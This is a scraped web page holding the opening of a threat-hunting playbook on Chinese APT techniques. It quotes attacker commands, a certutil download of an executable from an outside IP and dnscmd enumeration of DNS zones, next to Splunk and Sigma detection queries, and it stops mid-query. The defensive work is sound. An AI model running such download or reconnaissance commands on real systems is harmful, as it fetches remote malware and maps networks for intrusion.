href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign up</a></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="fu"><a rel="me" href="https://me.dm/@simonekrausocd">Mastodon</a></div><div class="l"><div class="fv fw fx fy fz l"><div class="ab cb"><div class="ci bh ga gb gc gd"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gj gk gl gm gn"></div><div class="go gp gq gr gs"><div class="ab cb"><div class="ci bh ga gb gc gd"><div><h1 id="7d3c" class="pw-post-title gt gu gv bf gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr bk" data-testid="storyTitle">Playbook Hunting Chinese APT</h1></div><div><h2 id="16b5" class="pw-subtitle-paragraph hs gu gv bf b ht hu hv hw hx hy hz ia ib ic id ie if ig ih cq du">Chinese APT TTPs and LOLBAS Operations</h2><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="ii ij ik il im ab"><div><div class="ab in"><div><div class="bm" aria-hidden="false"><a href="https://medium.com/@simone.kraus?source=post_page---byline--379a6b950492--------------------------------" rel="noopener follow"><div class="l io ip by iq ir"><div class="l fj"><img alt="SIMKRA" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/1*BIfekvQdxa7JrHyPD8XJVw.png" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="is by l dd de fs n it ft"></div></div></div></a></div></div><div class="iu ab fj"><div><div class="bm" aria-hidden="false"><a href="https://detect.fyi/?source=post_page---byline--379a6b950492--------------------------------" rel="noopener  ugc nofollow"><div class="l iv iw by iq ix"><div class="l fj"><img alt="Detect FYI" class="l fd by br iy cx" src="https://miro.medium.com/v2/resize:fill:48:48/1*ayMhoNccbO0IxQ1UPFv0SA.png" width="24" height="24" loading="lazy" data-testid="publicationPhoto"/><div class="is by l br iy fs n it ft"></div></div></div></a></div></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="iz ab q"><div class="ab q ja"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b jb jc bk"><a class="af ag ah ai aj ak al am an ao ap aq ar jd" data-testid="authorName" href="https://medium.com/@simone.kraus?source=post_page---byline--379a6b950492--------------------------------" rel="noopener follow">SIMKRA</a></p></div></div></div><span class="je jf" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b jb jc du"><span><a class="jg jh ah ai aj ak al am an ao ap aq ar ex ji jj" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F3d60ce83d2f7&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=post_page-3d60ce83d2f7--byline--379a6b950492---------------------post_header-----------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l jk"><span class="bf b bg z du"><div class="ab cn jl jm jn"><div class="fv fw ab"><div class="bf b bg z du ab jo"><span class="jp l jk">Published in</span><div><div class="l" aria-hidden="false"><a class="af ag ah ai aj ak al am an ao ap aq ar jd ab q" data-testid="publicationName" href="https://detect.fyi/?source=post_page---byline--379a6b950492--------------------------------" rel="noopener  ugc nofollow"><p class="bf b bg z jq jr js jt ju jv jw jx bk">Detect FYI</p></a></div></div></div><div class="h k"><span class="je jf" aria-hidden="true"><span class="bf b bg z du">·</span></span></div></div><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">28 min read</span><div class="jy jz l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Jan 1, 2025</span></div></span></div></span></div></div></div><div class="ab cp ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp"><div class="h k w fg fh q"><div class="lf l"><div class="ab q lg lh"><div class="pw-multi-vote-icon fj jp li lj lk"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fdetect-fyi%2F379a6b950492&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;user=SIMKRA&amp;userId=3d60ce83d2f7&amp;source=---header_actions--379a6b950492---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="ll ao lm ln lo lp am lq lr ls lk"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lt lu lv lw lx ly lz"><p class="bf b dv z du"><span class="ma">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao ll mb mc ab q fk md me" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="mf"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q kq kr ks kt ku kv kw kx ky kz la lb lc ld le"><div class="mg k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F379a6b950492&amp;operation=register&amp;redirect=https%3A%2F%2Fdetect.fyi%2Fplaybook-hunting-chinese-apt-379a6b950492&amp;source=---header_actions--379a6b950492---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du mh" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd mi cn"><div class="l ae"><div class="ab cb"><div class="mj mk ml mm mn mo ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al mp an ao ap ex mq mr me ms mt mu mv mw s mx my mz na nb nc nd u ne nf ng"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al mp an ao ap ex mq mr me ms mt mu mv mw s mx my mz na nb nc nd u ne nf ng"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><h2 id="9b5a" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Discovery, lateral movement, and collection activities</h2><p id="ff44" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">This hunting guide is developed to find Chinese APT and other threat actors. Therefore, the Advisory AA23–144a, MITRE ATT&amp;CK research and Cybersecurity Advisory on Chinese state-sponsored cyber operations: observed TTPs is used as a starting point to develop the hunting field manual.</p><h2 id="3cda" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">certutil</h2><blockquote class="ow ox oy"><p id="1eb9" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common <a class="af pf" href="https://www.mandiant.com/resources/game-over-detecting-and-stopping-an-apt41-operation" rel="noopener ugc nofollow" target="_blank"><strong class="of gw">TTP that we’ve observed APT41 use in past intrusions</strong></a>, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The <a class="af pf" href="https://www.mandiant.com/content/fireeye-www/en_US/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html" rel="noopener ugc nofollow" target="_blank"><strong class="of gw">usage of VMProtected binaries</strong></a> is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.</p></blockquote><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="1725" class="pp ni gv pm b bg pq pr l ps pt">certutil -urlcache -split -f http://91.208.184[.]78/2.exe</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_certutil_initiated_connection.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/network_connection/net_connection_win_certutil_initiated_connection.yml at…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qj l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="e020" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="71cb" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND (Image=”*\\certutil.exe” AND Initiated=”true” AND (DestinationPort=”80&quot; OR DestinationPort=”135&quot; OR DestinationPort=”443&quot; OR DestinationPort=”445&quot;))</span></pre><h2 id="ad20" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">dnscmd</h2><p id="2eb3" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Enumeration of the Environment</p><p id="7713" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">The following commands were used by the actor to enumerate the network topology [T1016], the active directory structure [T1069.002], and other information about the target environment [T1069.001], [T1082]:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="5919" class="pp ni gv pm b bg pq pr l ps pt">dnscmd . /enumrecords /zone {REDACTED}</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="a567" class="pp ni gv pm b bg pq pr l ps pt">dnscmd . /enumzones</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="67cf" class="pp ni gv pm b bg pq pr l ps pt">dnscmd . /enumzones dnscmd /enumrecords {REDACTED} . /additional</span></pre><p id="4ad3" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment</p><div class="pu pv pw px py pz"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="qp l qk ql qm qi qn mo pz"></div></div></div></a></div><h2 id="20a2" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">CAR Analytics LOLBAS with dnscmd</h2><p id="753c" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk"><a class="af pf" href="https://car.mitre.org/analytics/CAR-2020-05-003/" rel="noopener ugc nofollow" target="_blank">https://car.mitre.org/analytics/CAR-2020-05-003/</a></p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="b4d5" class="pp ni gv pm b bg pq pr l ps pt">index=__your_sysmon_index__ EventCode=1 (OriginalFileName = At.exe OR OriginalFileName = Atbroker.exe OR OriginalFileName = Bash.exe OR OriginalFileName = Bitsadmin.exe OR OriginalFileName = Certutil.exe OR OriginalFileName = Cmd.exe OR OriginalFileName = Cmdkey.exe OR OriginalFileName = Cmstp.exe OR OriginalFileName = Control.exe OR OriginalFileName = Csc.exe OR OriginalFileName = Cscript.exe OR OriginalFileName = Dfsvc.exe OR OriginalFileName = Diskshadow.exe OR OriginalFileName = Dnscmd.exe OR OriginalFileName = Esentutl.exe OR OriginalFileName = Eventvwr.exe OR OriginalFileName = Expand.exe OR OriginalFileName = Extexport.exe OR OriginalFileName = Extrac32.exe OR OriginalFileName = Findstr.exe OR OriginalFileName = Forfiles.exe OR OriginalFileName = Ftp.exe OR OriginalFileName = Gpscript.exe OR OriginalFileName = Hh.exe OR OriginalFileName = Ie4uinit.exe OR OriginalFileName = Ieexec.exe OR OriginalFileName = Infdefaultinstall.exe OR OriginalFileName = Installutil.exe OR OriginalFileName = Jsc.exe OR OriginalFileName = Makecab.exe OR OriginalFileName = Mavinject.exe OR OriginalFileName = Microsoft.Workflow.r.exe OR OriginalFileName = Mmc.exe OR OriginalFileName = Msbuild.exe OR OriginalFileName = Msconfig.exe OR OriginalFileName = Msdt.exe OR OriginalFileName = Mshta.exe OR OriginalFileName = Msiexec.exe OR OriginalFileName = Odbcconf.exe OR OriginalFileName = Pcalua.exe OR OriginalFileName = Pcwrun.exe OR OriginalFileName = Presentationhost.exe OR OriginalFileName = Print.exe OR OriginalFileName = Reg.exe OR OriginalFileName = Regasm.exe OR OriginalFileName = Regedit.exe OR OriginalFileName = Register-cimprovider.exe OR OriginalFileName = Regsvcs.exe OR OriginalFileName = Regsvr32.exe OR OriginalFileName = Replace.exe OR OriginalFileName = Rpcping.exe OR OriginalFileName = Rundll32.exe OR OriginalFileName = Runonce.exe OR OriginalFileName = Runscripthelper.exe OR OriginalFileName = Sc.exe OR OriginalFileName = Schtasks.exe OR OriginalFileName = Scriptrunner.exe OR OriginalFileName = SyncAppvPublishingServer.exe OR OriginalFileName = Tttracer.exe OR OriginalFileName = Verclsid.exe OR OriginalFileName = Wab.exe OR OriginalFileName = Wmic.exe OR OriginalFileName = Wscript.exe OR OriginalFileName = Wsreset.exe OR OriginalFileName = Xwizard.exe OR OriginalFileName = Advpack.dll OR OriginalFileName = Comsvcs.dll OR OriginalFileName = Ieadvpack.dll OR OriginalFileName = Ieaframe.dll OR OriginalFileName = Mshtml.dll OR OriginalFileName = Pcwutl.dll OR OriginalFileName = Setupapi.dll OR OriginalFileName = Shdocvw.dll OR OriginalFileName = Shell32.dll OR OriginalFileName = Syssetup.dll OR OriginalFileName = Url.dll OR OriginalFileName = Zipfldr.dll OR OriginalFileName = Appvlp.exe OR OriginalFileName = Bginfo.exe OR OriginalFileName = Cdb.exe OR OriginalFileName = csi.exe OR OriginalFileName = Devtoolslauncher.exe OR OriginalFileName = dnx.exe OR OriginalFileName = Dxcap.exe OR OriginalFileName = Excel.exe OR OriginalFileName = Mftrace.exe OR OriginalFileName = Msdeploy.exe OR OriginalFileName = msxsl.exe OR OriginalFileName = Powerpnt.exe OR OriginalFileName = rcsi.exe OR OriginalFileName = Sqler.exe OR OriginalFileName = Sqlps.exe OR OriginalFileName = SQLToolsPS.exe OR OriginalFileName = Squirrel.exe OR OriginalFileName = te.exe OR OriginalFileName = Tracker.exe OR OriginalFileName = Update.exe OR OriginalFileName = vsjitdebugger.exe OR OriginalFileName = Winword.exe OR OriginalFileName = Wsl.exe OR OriginalFileName = CL_Mutexverifiers.ps1 OR OriginalFileName = CL_Invocation.ps1 OR OriginalFileName = Manage-bde.wsf OR OriginalFileName = Pubprn.vbs OR OriginalFileName = Slmgr.vbs OR OriginalFileName = Syncappvpublishingserver.vbs OR OriginalFileName = winrm.vbs OR 